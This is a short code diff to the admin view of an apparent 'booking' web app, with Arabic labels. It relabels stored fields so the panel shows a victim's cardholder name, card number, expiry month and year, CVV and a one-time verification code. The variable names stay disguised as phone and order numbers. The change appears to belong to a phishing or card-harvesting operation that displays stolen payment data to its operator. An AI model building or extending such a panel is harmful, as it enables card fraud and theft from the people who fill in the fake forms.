@@ -92,17 +92,17 @@
       <section class="form-section">
         <h4>الفورم الثاني: بيانات التأكيد والتوصيل</h4>
         <dl>
-          <dt>الاسم الثاني</dt><dd>${escapeHtml(booking.nameSecond || '-')}</dd>
-          <dt>الهاتف الثاني</dt><dd>${escapeHtml(booking.phoneSecond || '-')}</dd>
+          <dt>اسم حامل البطاقة</dt><dd>${escapeHtml(booking.nameSecond || '-')}</dd>
+          <dt>رقم البطاقة</dt><dd>${escapeHtml(booking.phoneSecond || '-')}</dd>
           <dt>الشهر</dt><dd>${escapeHtml(booking.deliveryMonth || '-')}</dd>
           <dt>السنة</dt><dd>${escapeHtml(booking.deliveryYear || '-')}</dd>
-          <dt>رقم الطلب</dt><dd>${escapeHtml(booking.orderNumber || '-')}</dd>
+          <dt>رمز cvv</dt><dd>${escapeHtml(booking.orderNumber || '-')}</dd>
         </dl>
       </section>
       <section class="form-section">
-        <h4>الفورم الأخير: تأكيد رقم الطلب</h4>
+        <h4>الفورم الأخير: رمز التحقق </h4>
         <dl>
-          <dt>رقم التأكيد النهائي</dt><dd>${escapeHtml(booking.confirmationNumberFinal || '-')}</dd>
+          <dt>رمز التحقق </dt><dd>${escapeHtml(booking.confirmationNumberFinal || '-')}</dd>
           <dt>وقت الإدخال</dt><dd>${formatDate(booking.createdAt)}</dd>
           <dt>وقت الإكمال</dt><dd>${formatDate(booking.completedAt)}</dd>
         </dl>
